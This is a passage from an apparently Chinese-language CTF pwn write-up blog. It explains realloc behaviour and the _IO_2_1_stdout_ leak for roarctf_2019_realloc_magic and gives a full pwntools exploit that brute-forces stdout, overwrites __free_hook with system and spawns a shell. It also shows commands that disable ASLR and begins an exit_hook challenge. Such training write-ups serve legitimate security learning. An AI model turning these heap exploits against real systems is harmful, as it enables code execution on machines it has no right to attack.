debug<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x12bf)'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Press enter to continue'</span><span class="token punctuation">,</span><span class="token string">b'\t'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Pick a number: '</span><span class="token punctuation">,</span><span class="token string">b'6\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'is: '</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ec7e3</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'(max 256)? '</span><span class="token punctuation">,</span><span class="token string">b'256'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>one_gadgets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>反思，为啥看到一个无法利用的点没有去找别的地方。</p>
<h2 id="20-BUU-roarctf-2019-realloc-magic-realloc利用，IO-leak使用"><a href="#20-BUU-roarctf-2019-realloc-magic-realloc利用，IO-leak使用" class="headerlink" title="20.BUU roarctf_2019_realloc_magic(realloc利用，IO leak使用)"></a>20.<strong>BUU roarctf_2019_realloc_magic(realloc利用，IO leak使用)</strong></h2><p>做了快一天的一道题，学习到了realloc的特性，以及IO leak的使用，算是收获很多，还学到了如何关闭本地ASLR方便调试。2.27的64位保护全开。一道菜单题，没有show，这也是使用IO leak的原因</p>
<p><img src="https://pic1.zhimg.com/80/v2-1e2a3db0b73c6b3df806506c6cf17e9a_1440w.png?source=d16d100b" alt="img"></p>
<p>add使用了realloc</p>
<p><img src="https://pic1.zhimg.com/80/v2-4cdaea2b32aff37c177b38903194412a_1440w.png?source=d16d100b" alt="img"></p>
<p>delete存在UAF</p>
<p><img src="https://picx.zhimg.com/80/v2-11fe40eaf7fd8692e843c0e74ebda34b_1440w.png?source=d16d100b" alt="img"></p>
<p>只能使用一次的ba函数，用于将指针置0</p>
<p><img src="https://pica.zhimg.com/80/v2-55c9412c52b8af0c5c7461da4d28bc82_1440w.png?source=d16d100b" alt="img"></p>
<p>这道题目看着很简答，但因为使用了realloc并且没有show，所以需要用很多东西来做。</p>
<p>首先第一个知识点是realloc，记录一下：</p>
<p>realloc(void* ptr, size_t size) </p>
<p>当ptr为空时，使用realloc等同与malloc</p>
<p>ptr不为空时，且size为0时，相当于free(ptr)且返回0，<strong>也就是free后还将指针置0</strong></p>
<p>ptr不为空时，且size不为0时，也就是ptr已经被分配过，就会对这个chunk的大小进行更改：</p>
<ul>
<li>当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去</li>
<li>当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针</li>
</ul>
<p>所以使用realloc可能会出现很多问题，一般不要轻易使用。</p>
<p>接下来就是如何泄露libc的方法，用到了IO leak，其原理是<code>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。</code></p>
<p>具体用法就是尝试申请到_IO_2_1_stdout_结构体，修改以下几个点：</p>
<ul>
<li><strong>修改_flags字段为0xfbad1887</strong></li>
<li><strong>修改_IO_read_ptr、_IO_read_end、_IO_read_base这三个指针值为0</strong></li>
<li><strong>修改_IO_write_base指针的最后一字节为00（不一定非要是00，只要将_IO_write_base指针改的小于_IO_write_ptr指针并且确定这二者之间存在libc地址，都是可以的）</strong></li>
</ul>
<p>在修改完成后只要程序调用了puts函数，就会输出一个libc地址，就可以获得libc地址了。具体原理可以看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12638?time__1311=GqGxuDRiiQdCqGN4lhF35AK40KD=zqW4D">IO leak - 先知社区</a>。</p>
<p>因为没有show，所以我们首先考虑如何来做IO leak，首先我们要知道，<code>_IO_2_1_stdout_</code>与键入unsortbin的chunk所指向的main_arena+96只有后两字节不相同，且<code>_IO_2_1_stdout_</code>的后三位760是不会变的，所以我们只要在覆盖时爆破一位就好了。那么如何到达爆破这一步呢</p>
<p><img src="https://picx.zhimg.com/80/v2-dc7dec7977571772b097b007d52f4318_1440w.png?source=d16d100b" alt="img"></p>
<p>我们利用realloc申请三个chunk，且每次申请后就free，这样可以让指针置0，而不是在原有的chunk上进行大小的更改，申请好以后我们再将大小为0x80的chunk申请出来，并利用delete释放7次，填满大小为0x90的tcache，再用一次add(size=0)，进入tcache，这时候的堆情况就是下图所示</p>
<p><img src="https://pic1.zhimg.com/80/v2-db3b030ac7ef0f75df1a5002bfa99140_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-e99fd911c9bef609244bd1addd4c45fc_1440w.png?source=d16d100b" alt="img"></p>
<p>接下来就是如何覆盖了，将大小为0x30的chunk给申请出，并使用一次realloc的本来功能：修改一个chunk的大小，我们将其大小修改到可以覆盖存有(main_arena+96)的位置，并对其进行覆盖，覆盖后如下图所示，覆盖成功，但并没有指向stdout，因为需要爆破，在本地调试的时候我们可以将ASLR关闭，这样每次main_arena和stdout的地址都不会变，就可以很好的调试了</p>
<p><img src="https://picx.zhimg.com/80/v2-7eb0ade68fb7d32af4091b64ab97e2a0_1440w.png?source=d16d100b" alt="img"></p>
<p>接下来就是将stdout取出并写值，将当前ptr置0，取出一个0x90的，realloc改变大小，ptr置0，再取一个0x90，就取到了，修改，我们可以观察_IO_2_1_stdout_的值，但是要注意，想要观察被改变的_IO_2_1_stdout_，我们需要在调用puts前观察，因为调用后，经过了IO 缓冲区已经刷新了，值就变了，所以我们需要把断点打在刚修改，没有调用puts的时候。</p>
<p><img src="https://picx.zhimg.com/80/v2-ed8f9e59706d93d7ca7db5df8b796d46_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-35f514b3cafc6655743c052714756b51_1440w.png" alt="img"></p>
<p>修改成功过后就可以泄露libc地址了，接下来就是再一次利用上面的方法，来打free_hook。不再做演示，在调试完成后需要爆破，写成一个函数，爆破就好了，遇到一个问题，爆破的时候，把sh = process(filename)写到函数里面会失败，写到外面就可以，为啥呢，给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'>> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'Size?'</span>
add_content_words <span class="token operator">=</span> <span class="token string">'Content?'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">4</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># debug()</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#用于修改</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#用于进入unsortbin</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#隔绝topchunk</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#填满tcahce</span>
        delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#进入unsortbin</span>
    
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#取出在tcache中的chunk0,</span>
    <span class="token comment"># add(size=0x40,content=b'a'*0x20+p64(0)+p64(0x91)+b'\x60\x07\xdd')#关闭ASLR本地调试时使用.</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x60\x87'</span><span class="token punctuation">)</span><span class="token comment">#爆破一位（要爆破8那里）</span>
    
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'bbb'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x80</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#IO leak利用    </span>
    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3e82a0</span>
    <span class="token keyword">if</span> libc<span class="token punctuation">.</span>address <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3e82a0</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
    system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> 
    <span class="token comment">#利用一次置零</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#----------------------------------</span>
    <span class="token comment">#一样的利用，freehook写入system</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment"># add(size=0x70,content=b'a')</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#填满tcahce</span>
        delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'cccc'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'd'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    leak_info<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xc0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment"># sh = remote('node5.buuoj.cn', 27182)</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pwn()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 记录一下修改ASLR的方法：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">## 未开启：地址随机化关闭</span>
<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
<span class="token comment">## 半开启：随机化 stack 、librarys</span>
<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
<span class="token comment">## 全开启：随机化 stack 、librarys 、heap（默认选项）</span>
<span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="21-BUU-ciscn-2019-n-7（exit-hook）"><a href="#21-BUU-ciscn-2019-n-7（exit-hook）" class="headerlink" title="21.BUU ciscn_2019_n_7（exit_hook）"></a>21.BUU ciscn_2019_n_7（exit_hook）</h2><p>算是第一次好好做了一下exit_hook的题，记录一下，64位2.23的题，题目直接给出了libc，不用泄露，直接利用就好了，有一个任意地址写，没有free，所以打exit_hook</p>
<p><img src="/images/v2-72c99366c8ffe602f41f1ab4ae7446c5_720w.png" alt="img"></p>
<p><img src="/images/v2-b7b14a8dfe4408f127a343db508a9162_720w.png" alt="img"></p>
<p><img src="/images/v2-976c269cd88add566bdba52279894a1d_720w.png" alt="img"></p>
<p>所以做法就是将free_hook的地址写到地址存储位，通过edit来修改其值，改为one_gadgets即可</p>
<p><img src="/images/v2-70c4b38d37e55362e88677870b0ce892_720w.png" alt="img"></p>
<p>free_hook怎么打的呢，将<code>_rtld_global._dl_rtld_lock_recursive </code>覆盖为one_gadgets，或者将<code>_rtld_global._dl_rtld_lock_recursive</code>覆盖为system，将<code>(_rtld_global._dl_load_lock).mutex</code>覆盖为/bin/sh，即可getshell，但第二种方法有可能失败，因为不能system的后两个参数。</p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
